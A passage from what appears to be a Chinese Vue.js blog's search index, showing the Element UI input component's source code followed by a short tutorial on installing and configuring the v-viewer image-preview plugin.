&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input</span></span><br><span class="line"><span class="regexp">        :tabindex="tabindex"</span></span><br><span class="line"><span class="regexp">        v-if="type !== 'textarea'"</span></span><br><span class="line"><span class="regexp">        class="el-input__inner"</span></span><br><span class="line"><span class="regexp">        v-bind="$attrs"</span></span><br><span class="line"><span class="regexp">        :type="showPassword ? (passwordVisible ? 'text': 'password') : type"</span></span><br><span class="line"><span class="regexp">        :disabled="inputDisabled"</span></span><br><span class="line"><span class="regexp">        :readonly="readonly"</span></span><br><span class="line"><span class="regexp">        :autocomplete="autoComplete || autocomplete"</span></span><br><span class="line"><span class="regexp">        ref="input"</span></span><br><span class="line"><span class="regexp">        @compositionstart="handleCompositionStart"</span></span><br><span class="line"><span class="regexp">        @compositionupdate="handleCompositionUpdate"</span></span><br><span class="line"><span class="regexp">        @compositionend="handleCompositionEnd"</span></span><br><span class="line"><span class="regexp">        @input="handleInput"</span></span><br><span class="line"><span class="regexp">        @focus="handleFocus"</span></span><br><span class="line"><span class="regexp">        @blur="handleBlur"</span></span><br><span class="line"><span class="regexp">        @change="handleChange"</span></span><br><span class="line"><span class="regexp">        :aria-label="label"</span></span><br><span class="line"><span class="regexp">      &gt;</span></span><br><span class="line"><span class="regexp">      &lt;!-- 前置内容 --&gt;</span></span><br><span class="line"><span class="regexp">      &lt;span class="el-input__prefix" v-if="$slots.prefix || prefixIcon"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;slot name="prefix"&gt;&lt;/</span>slot&gt;</span><br><span class="line">        &lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__icon"</span></span><br><span class="line">           v-<span class="keyword">if</span>=<span class="string">"prefixIcon"</span></span><br><span class="line">           :<span class="class"><span class="keyword">class</span></span>=<span class="string">"prefixIcon"</span>&gt;</span><br><span class="line">        &lt;<span class="regexp">/i&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>span&gt;</span><br><span class="line">      &lt;!-- 后置内容 --&gt;</span><br><span class="line">      &lt;span</span><br><span class="line">        <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__suffix"</span></span><br><span class="line">        v-<span class="keyword">if</span>=<span class="string">"getSuffixVisible()"</span>&gt;</span><br><span class="line">        &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__suffix-inner"</span>&gt;</span><br><span class="line">          &lt;template v-<span class="keyword">if</span>=<span class="string">"!showClear || !showPwdVisible || !isWordLimitVisible"</span>&gt;</span><br><span class="line">            &lt;slot name=<span class="string">"suffix"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line">            &lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__icon"</span></span><br><span class="line">              v-<span class="keyword">if</span>=<span class="string">"suffixIcon"</span></span><br><span class="line">              :<span class="class"><span class="keyword">class</span></span>=<span class="string">"suffixIcon"</span>&gt;</span><br><span class="line">            &lt;<span class="regexp">/i&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>template&gt;</span><br><span class="line">          &lt;i v-<span class="keyword">if</span>=<span class="string">"showClear"</span></span><br><span class="line">            <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__icon el-icon-circle-close el-input__clear"</span></span><br><span class="line">            @mousedown.prevent</span><br><span class="line">            @click=<span class="string">"clear"</span></span><br><span class="line">          &gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">          &lt;i v-<span class="keyword">if</span>=<span class="string">"showPwdVisible"</span></span><br><span class="line">            <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__icon el-icon-view el-input__clear"</span></span><br><span class="line">            @click=<span class="string">"handlePasswordVisible"</span></span><br><span class="line">          &gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">          &lt;span v-<span class="keyword">if</span>=<span class="string">"isWordLimitVisible"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__count"</span>&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input__count-inner"</span>&gt;</span><br><span class="line">              &#123;&#123; textLength &#125;&#125;/&#123;&#123; upperLimit &#125;&#125;</span><br><span class="line">            &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>span&gt;</span><br><span class="line">        &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">        &lt;i class="el-input__icon"</span></span><br><span class="line"><span class="regexp">          v-if="validateState"</span></span><br><span class="line"><span class="regexp">          :class="['el-input__validateIcon', validateIcon]"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/i</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">      &lt;!-- 后置元素 --&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div class="el-input-group__append" v-if="$slots.append"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;slot name="append"&gt;&lt;/</span>slot&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>template&gt;</span><br><span class="line">    &lt;textarea</span><br><span class="line">      v-<span class="keyword">else</span></span><br><span class="line">      :tabindex=<span class="string">"tabindex"</span></span><br><span class="line">      <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-textarea__inner"</span></span><br><span class="line">      @compositionstart=<span class="string">"handleCompositionStart"</span></span><br><span class="line">      @compositionupdate=<span class="string">"handleCompositionUpdate"</span></span><br><span class="line">      @compositionend=<span class="string">"handleCompositionEnd"</span></span><br><span class="line">      @input=<span class="string">"handleInput"</span></span><br><span class="line">      ref=<span class="string">"textarea"</span></span><br><span class="line">      v-bind=<span class="string">"$attrs"</span></span><br><span class="line">      :disabled=<span class="string">"inputDisabled"</span></span><br><span class="line">      :readonly=<span class="string">"readonly"</span></span><br><span class="line">      :autocomplete=<span class="string">"autoComplete || autocomplete"</span></span><br><span class="line">      :style=<span class="string">"textareaStyle"</span></span><br><span class="line">      @focus=<span class="string">"handleFocus"</span></span><br><span class="line">      @blur=<span class="string">"handleBlur"</span></span><br><span class="line">      @change=<span class="string">"handleChange"</span></span><br><span class="line">      :aria-label=<span class="string">"label"</span></span><br><span class="line">    &gt;</span><br><span class="line">    &lt;<span class="regexp">/textarea&gt;</span></span><br><span class="line"><span class="regexp">    &lt;span v-if="isWordLimitVisible &amp;&amp; type === 'textarea'" class="el-input__count"&gt;&#123;&#123; textLength &#125;&#125;/</span>&#123;&#123; upperLimit &#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  import emitter from 'element-ui/</span>src/mixins/emitter<span class="string">';</span></span><br><span class="line"><span class="string">  import Migrating from '</span>element-ui/src/mixins/migrating<span class="string">';</span></span><br><span class="line"><span class="string">  import calcTextareaHeight from '</span>./calcTextareaHeight<span class="string">';</span></span><br><span class="line"><span class="string">  import merge from '</span>element-ui/src/utils/merge<span class="string">';</span></span><br><span class="line"><span class="string">  import &#123;isKorean&#125; from '</span>element-ui/src/utils/shared<span class="string">';</span></span><br><span class="line"><span class="string">  export default &#123;</span></span><br><span class="line"><span class="string">    name: '</span>ElInput<span class="string">',</span></span><br><span class="line"><span class="string">    componentName: '</span>ElInput<span class="string">',</span></span><br><span class="line"><span class="string">    mixins: [emitter, Migrating],</span></span><br><span class="line"><span class="string">    inheritAttrs: false,</span></span><br><span class="line"><span class="string">    inject: &#123;</span></span><br><span class="line"><span class="string">      elForm: &#123;</span></span><br><span class="line"><span class="string">        default: '</span><span class="string">'</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      elFormItem: &#123;</span></span><br><span class="line"><span class="string">        default: '</span><span class="string">'</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    data() &#123;</span></span><br><span class="line"><span class="string">      return &#123;</span></span><br><span class="line"><span class="string">        textareaCalcStyle: &#123;&#125;,</span></span><br><span class="line"><span class="string">        hovering: false,</span></span><br><span class="line"><span class="string">        focused: false,</span></span><br><span class="line"><span class="string">        isComposing: false,</span></span><br><span class="line"><span class="string">        passwordVisible: false</span></span><br><span class="line"><span class="string">      &#125;;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    props: &#123;</span></span><br><span class="line"><span class="string">      value: [String, Number],</span></span><br><span class="line"><span class="string">      size: String,</span></span><br><span class="line"><span class="string">      resize: String,</span></span><br><span class="line"><span class="string">      form: String,</span></span><br><span class="line"><span class="string">      disabled: Boolean,</span></span><br><span class="line"><span class="string">      readonly: Boolean,</span></span><br><span class="line"><span class="string">      type: &#123;</span></span><br><span class="line"><span class="string">        type: String,</span></span><br><span class="line"><span class="string">        default: '</span>text<span class="string">'</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      autosize: &#123;</span></span><br><span class="line"><span class="string">        type: [Boolean, Object],</span></span><br><span class="line"><span class="string">        default: false</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      autocomplete: &#123;</span></span><br><span class="line"><span class="string">        type: String,</span></span><br><span class="line"><span class="string">        default: '</span>off<span class="string">'</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">      /** @Deprecated in next major version */</span></span><br><span class="line"><span class="string">      autoComplete: &#123;</span></span><br><span class="line"><span class="string">        type: String,</span></span><br><span class="line"><span class="string">        validator(val) &#123;</span></span><br><span class="line"><span class="string">          process.env.NODE_ENV !== '</span>production<span class="string">' &amp;&amp;</span></span><br><span class="line"><span class="string">            console.warn('</span>[Element Warn][Input]\<span class="string">'auto-complete\' property will be deprecated in next major version. please use \'autocomplete\' instead.'</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      validateEvent: &#123;</span><br><span class="line">        type: <span class="built_in">Boolean</span>,</span><br><span class="line">        <span class="keyword">default</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      suffixIcon: <span class="built_in">String</span>,</span><br><span class="line">      prefixIcon: <span class="built_in">String</span>,</span><br><span class="line">      label: <span class="built_in">String</span>,</span><br><span class="line">      clearable: &#123;</span><br><span class="line">        type: <span class="built_in">Boolean</span>,</span><br><span class="line">        <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      showPassword: &#123;</span><br><span class="line">        type: <span class="built_in">Boolean</span>,</span><br><span class="line">        <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      showWordLimit: &#123;</span><br><span class="line">        type: <span class="built_in">Boolean</span>,</span><br><span class="line">        <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      tabindex: <span class="built_in">String</span></span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">      _elFormItemSize() &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.elFormItem || &#123;&#125;).elFormItemSize;</span><br><span class="line">      &#125;,</span><br><span class="line">      validateState() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.elFormItem ? <span class="keyword">this</span>.elFormItem.validateState : <span class="string">''</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      needStatusIcon() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.elForm ? <span class="keyword">this</span>.elForm.statusIcon : <span class="literal">false</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      validateIcon() &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          validating: <span class="string">'el-icon-loading'</span>,</span><br><span class="line">          success: <span class="string">'el-icon-circle-check'</span>,</span><br><span class="line">          error: <span class="string">'el-icon-circle-close'</span></span><br><span class="line">        &#125;[<span class="keyword">this</span>.validateState];</span><br><span class="line">      &#125;,</span><br><span class="line">      textareaStyle() &#123;</span><br><span class="line">        <span class="keyword">return</span> merge(&#123;&#125;, <span class="keyword">this</span>.textareaCalcStyle, &#123; <span class="attr">resize</span>: <span class="keyword">this</span>.resize &#125;);</span><br><span class="line">      &#125;,</span><br><span class="line">      inputSize() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.size || <span class="keyword">this</span>._elFormItemSize || (<span class="keyword">this</span>.$ELEMENT || &#123;&#125;).size;</span><br><span class="line">      &#125;,</span><br><span class="line">      inputDisabled() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.disabled || (<span class="keyword">this</span>.elForm || &#123;&#125;).disabled;</span><br><span class="line">      &#125;,</span><br><span class="line">      nativeInputValue() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.value === <span class="literal">null</span> || <span class="keyword">this</span>.value === <span class="literal">undefined</span> ? <span class="string">''</span> : <span class="built_in">String</span>(<span class="keyword">this</span>.value);</span><br><span class="line">      &#125;,</span><br><span class="line">      showClear() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.clearable &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.inputDisabled &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.readonly &amp;&amp;</span><br><span class="line">          <span class="keyword">this</span>.nativeInputValue &amp;&amp;</span><br><span class="line">          (<span class="keyword">this</span>.focused || <span class="keyword">this</span>.hovering);</span><br><span class="line">      &#125;,</span><br><span class="line">      showPwdVisible() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.showPassword &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.inputDisabled &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.readonly &amp;&amp;</span><br><span class="line">          (!!<span class="keyword">this</span>.nativeInputValue || <span class="keyword">this</span>.focused);</span><br><span class="line">      &#125;,</span><br><span class="line">      isWordLimitVisible() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.showWordLimit &amp;&amp;</span><br><span class="line">          <span class="keyword">this</span>.$attrs.maxlength &amp;&amp;</span><br><span class="line">          (<span class="keyword">this</span>.type === <span class="string">'text'</span> || <span class="keyword">this</span>.type === <span class="string">'textarea'</span>) &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.inputDisabled &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.readonly &amp;&amp;</span><br><span class="line">          !<span class="keyword">this</span>.showPassword;</span><br><span class="line">      &#125;,</span><br><span class="line">      upperLimit() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$attrs.maxlength;</span><br><span class="line">      &#125;,</span><br><span class="line">      textLength() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.value === <span class="string">'number'</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">String</span>(<span class="keyword">this</span>.value).length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.value || <span class="string">''</span>).length;</span><br><span class="line">      &#125;,</span><br><span class="line">      inputExceed() &#123;</span><br><span class="line">        <span class="comment">// show exceed style if length of initial value greater then maxlength</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.isWordLimitVisible &amp;&amp;</span><br><span class="line">          (<span class="keyword">this</span>.textLength &gt; <span class="keyword">this</span>.upperLimit);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;</span><br><span class="line">      value(val) &#123;</span><br><span class="line">        <span class="keyword">this</span>.$nextTick(<span class="keyword">this</span>.resizeTextarea);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.validateEvent) &#123;</span><br><span class="line">          <span class="keyword">this</span>.dispatch(<span class="string">'ElFormItem'</span>, <span class="string">'el.form.change'</span>, [val]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// native input value is set explicitly</span></span><br><span class="line">      <span class="comment">// do not use v-model / :value in template</span></span><br><span class="line">      <span class="comment">// see: https://github.com/ElemeFE/element/issues/14521</span></span><br><span class="line">      nativeInputValue() &#123;</span><br><span class="line">        <span class="keyword">this</span>.setNativeInputValue();</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// when change between &lt;input&gt; and &lt;textarea&gt;,</span></span><br><span class="line">      <span class="comment">// update DOM dependent value and styles</span></span><br><span class="line">      <span class="comment">// https://github.com/ElemeFE/element/issues/14857</span></span><br><span class="line">      type() &#123;</span><br><span class="line">        <span class="keyword">this</span>.$nextTick(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.setNativeInputValue();</span><br><span class="line">          <span class="keyword">this</span>.resizeTextarea();</span><br><span class="line">          <span class="keyword">this</span>.updateIconOffset();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      focus() &#123;</span><br><span class="line">        <span class="keyword">this</span>.getInput().focus();</span><br><span class="line">      &#125;,</span><br><span class="line">      blur() &#123;</span><br><span class="line">        <span class="keyword">this</span>.getInput().blur();</span><br><span class="line">      &#125;,</span><br><span class="line">      getMigratingConfig() &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          props: &#123;</span><br><span class="line">            <span class="string">'icon'</span>: <span class="string">'icon is removed, use suffix-icon / prefix-icon instead.'</span>,</span><br><span class="line">            <span class="string">'on-icon-click'</span>: <span class="string">'on-icon-click is removed.'</span></span><br><span class="line">          &#125;,</span><br><span class="line">          events: &#123;</span><br><span class="line">            <span class="string">'click'</span>: <span class="string">'click is removed.'</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;,</span><br><span class="line">      handleBlur(event) &#123;</span><br><span class="line">        <span class="keyword">this</span>.focused = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'blur'</span>, event);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.validateEvent) &#123;</span><br><span class="line">          <span class="keyword">this</span>.dispatch(<span class="string">'ElFormItem'</span>, <span class="string">'el.form.blur'</span>, [<span class="keyword">this</span>.value]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      select() &#123;</span><br><span class="line">        <span class="keyword">this</span>.getInput().select();</span><br><span class="line">      &#125;,</span><br><span class="line">      resizeTextarea() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.$isServer) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">const</span> &#123; autosize, type &#125; = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (type !== <span class="string">'textarea'</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (!autosize) &#123;</span><br><span class="line">          <span class="keyword">this</span>.textareaCalcStyle = &#123;</span><br><span class="line">            minHeight: calcTextareaHeight(<span class="keyword">this</span>.$refs.textarea).minHeight</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> minRows = autosize.minRows;</span><br><span class="line">        <span class="keyword">const</span> maxRows = autosize.maxRows;</span><br><span class="line">        <span class="keyword">this</span>.textareaCalcStyle = calcTextareaHeight(<span class="keyword">this</span>.$refs.textarea, minRows, maxRows);</span><br><span class="line">      &#125;,</span><br><span class="line">      setNativeInputValue() &#123;</span><br><span class="line">        <span class="keyword">const</span> input = <span class="keyword">this</span>.getInput();</span><br><span class="line">        <span class="keyword">if</span> (!input) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (input.value === <span class="keyword">this</span>.nativeInputValue) <span class="keyword">return</span>;</span><br><span class="line">        input.value = <span class="keyword">this</span>.nativeInputValue;</span><br><span class="line">      &#125;,</span><br><span class="line">      handleFocus(event) &#123;</span><br><span class="line">        <span class="keyword">this</span>.focused = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'focus'</span>, event);</span><br><span class="line">      &#125;,</span><br><span class="line">      handleCompositionStart() &#123;</span><br><span class="line">        <span class="keyword">this</span>.isComposing = <span class="literal">true</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">      handleCompositionUpdate(event) &#123;</span><br><span class="line">        <span class="keyword">const</span> text = event.target.value;</span><br><span class="line">        <span class="keyword">const</span> lastCharacter = text[text.length - <span class="number">1</span>] || <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">this</span>.isComposing = !isKorean(lastCharacter);</span><br><span class="line">      &#125;,</span><br><span class="line">      handleCompositionEnd(event) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isComposing) &#123;</span><br><span class="line">          <span class="keyword">this</span>.isComposing = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">this</span>.handleInput(event);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      handleInput(event) &#123;</span><br><span class="line">        <span class="comment">// should not emit input during composition</span></span><br><span class="line">        <span class="comment">// see: https://github.com/ElemeFE/element/issues/10516</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isComposing) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// hack for https://github.com/ElemeFE/element/issues/8548</span></span><br><span class="line">        <span class="comment">// should remove the following line when we don't support IE</span></span><br><span class="line">        <span class="keyword">if</span> (event.target.value === <span class="keyword">this</span>.nativeInputValue) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'input'</span>, event.target.value);</span><br><span class="line">        <span class="comment">// ensure native input value is controlled</span></span><br><span class="line">        <span class="comment">// see: https://github.com/ElemeFE/element/issues/12850</span></span><br><span class="line">        <span class="keyword">this</span>.$nextTick(<span class="keyword">this</span>.setNativeInputValue);</span><br><span class="line">      &#125;,</span><br><span class="line">      handleChange(event) &#123;</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'change'</span>, event.target.value);</span><br><span class="line">      &#125;,</span><br><span class="line">      calcIconOffset(place) &#123;</span><br><span class="line">        <span class="keyword">let</span> elList = [].slice.call(<span class="keyword">this</span>.$el.querySelectorAll(<span class="string">`.el-input__<span class="subst">$&#123;place&#125;</span>`</span>) || []);</span><br><span class="line">        <span class="keyword">if</span> (!elList.length) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">let</span> el = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; elList.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (elList[i].parentNode === <span class="keyword">this</span>.$el) &#123;</span><br><span class="line">            el = elList[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!el) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">const</span> pendantMap = &#123;</span><br><span class="line">          suffix: <span class="string">'append'</span>,</span><br><span class="line">          prefix: <span class="string">'prepend'</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">const</span> pendant = pendantMap[place];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.$slots[pendant]) &#123;</span><br><span class="line">          el.style.transform = <span class="string">`translateX(<span class="subst">$&#123;place === <span class="string">'suffix'</span> ? <span class="string">'-'</span> : <span class="string">''</span>&#125;</span><span class="subst">$&#123;<span class="keyword">this</span>.$el.querySelector(<span class="string">`.el-input-group__<span class="subst">$&#123;pendant&#125;</span>`</span>).offsetWidth&#125;</span>px)`</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          el.removeAttribute(<span class="string">'style'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      updateIconOffset() &#123;</span><br><span class="line">        <span class="keyword">this</span>.calcIconOffset(<span class="string">'prefix'</span>);</span><br><span class="line">        <span class="keyword">this</span>.calcIconOffset(<span class="string">'suffix'</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      clear() &#123;</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'input'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'change'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'clear'</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      handlePasswordVisible() &#123;</span><br><span class="line">        <span class="keyword">this</span>.passwordVisible = !<span class="keyword">this</span>.passwordVisible;</span><br><span class="line">        <span class="keyword">this</span>.focus();</span><br><span class="line">      &#125;,</span><br><span class="line">      getInput() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$refs.input || <span class="keyword">this</span>.$refs.textarea;</span><br><span class="line">      &#125;,</span><br><span class="line">      getSuffixVisible() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.$slots.suffix ||</span><br><span class="line">          <span class="keyword">this</span>.suffixIcon ||</span><br><span class="line">          <span class="keyword">this</span>.showClear ||</span><br><span class="line">          <span class="keyword">this</span>.showPassword ||</span><br><span class="line">          <span class="keyword">this</span>.isWordLimitVisible ||</span><br><span class="line">          (<span class="keyword">this</span>.validateState &amp;&amp; <span class="keyword">this</span>.needStatusIcon);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    created() &#123;</span><br><span class="line">      <span class="keyword">this</span>.$on(<span class="string">'inputSelect'</span>, <span class="keyword">this</span>.select);</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">      <span class="keyword">this</span>.setNativeInputValue();</span><br><span class="line">      <span class="keyword">this</span>.resizeTextarea();</span><br><span class="line">      <span class="keyword">this</span>.updateIconOffset();</span><br><span class="line">    &#125;,</span><br><span class="line">    updated() &#123;</span><br><span class="line">      <span class="keyword">this</span>.$nextTick(<span class="keyword">this</span>.updateIconOffset);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>组件库</category>
      </categories>
      <tags>
        <tag>组件库</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue中使用v-viewer插件</title>
    <url>/2019/07/20/Vue%E4%B8%AD%E4%BD%BF%E7%94%A8v-viewer%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近的一个社区项目中需要用到移动端图片预览的功能，还需要能够左右切换、缩放等功能，于是在网上找了一下。发现vue-photo-preview和v-viewer（将viewerjs、封装为vue组件来调用）都还还不错，最终还是选择了v-viewer，感觉其缩放比较人性化，不用点击按钮，并且下面的缩略图还不错。下面就介绍一下v-viewer的使用：<br><a id="more"></a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="-安装"></a>-安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install v-viewer</span><br></pre></td></tr></table></figure>
<h3 id="引入"><a href="#引入" class="headerlink" title="-引入"></a>-引入</h3><ul>
<li>这里是在main.js中直接引入的，并设置了默认的选项</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Viewer <span class="keyword">from</span> <span class="string">'v-viewer'</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'viewerjs/dist/viewer.css'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Viewer, &#123;</span><br><span class="line">  defaultOptions: &#123;</span><br><span class="line">  zIndex: <span class="number">9999</span>,</span><br><span class="line">  toolbar: <span class="number">0</span>,</span><br><span class="line">  keyboard: <span class="literal">false</span>,</span><br><span class="line">  title: <span class="literal">false</span>,</span><br><span class="line">  movable: <span class="literal">true</span>,</span><br><span class="line">  zoomable: <span class="literal">false</span>,</span><br><span class="line">  scalable: <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>具体参数的解释会在后边展示</li>
<li>除了在main.js中调用，还可以在我们需要的页面直接引入</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'viewerjs/dist/viewer.css'</span></span><br><span class="line"><span class="keyword">import</span> Viewer <span class="keyword">from</span> <span class="string">'v-viewer'</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line">Vue.use(Viewer)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    images: [<span class="string">'1.jpg'</span>, <span class="string">'2.jpg'</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    show () &#123;</span><br><span class="line">      <span class="keyword">const</span> viewer = <span class="keyword">this</span>.$el.querySelector(<span class="string">'.images'</span>).$viewer</span><br><span class="line">      viewer.show()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
